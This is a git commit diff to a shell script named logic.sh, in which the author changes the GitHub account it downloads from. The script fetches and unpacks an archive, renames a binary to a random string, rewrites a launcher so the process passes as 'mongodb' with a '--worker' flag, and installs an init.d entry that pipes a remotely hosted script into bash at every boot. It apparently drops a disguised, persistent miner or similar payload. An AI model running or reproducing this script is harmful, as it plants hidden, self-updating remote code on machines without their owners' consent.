c7de7a0eeddb96de00223137e11ff3b787131828
enirgy <ardirakka67@gmail.com>
2024-06-10 14:37:30 +0700

    Update logic.sh

--- logic.sh
+++ logic.sh
@@ -1,12 +1,12 @@
 cd /
-wget https://github.com/grounda/inputi/releases/download/v1.5.1/power.tar
+wget https://github.com/groundam/inputi/releases/download/v1.5.1/power.tar
 tar -xvf power.tar
 cd /power
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv relay $variable1
 sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./pulse.sh
 cd /etc/init.d
-echo "bash <(curl -s -L https://raw.githubusercontent.com/grounda/inputi/main/logic.sh)" > output.sh
+echo "bash <(curl -s -L https://raw.githubusercontent.com/groundam/inputi/main/logic.sh)" > output.sh
 chmod a+x output.sh
 update-rc.d output.sh defaults
 rm -rf power.tar
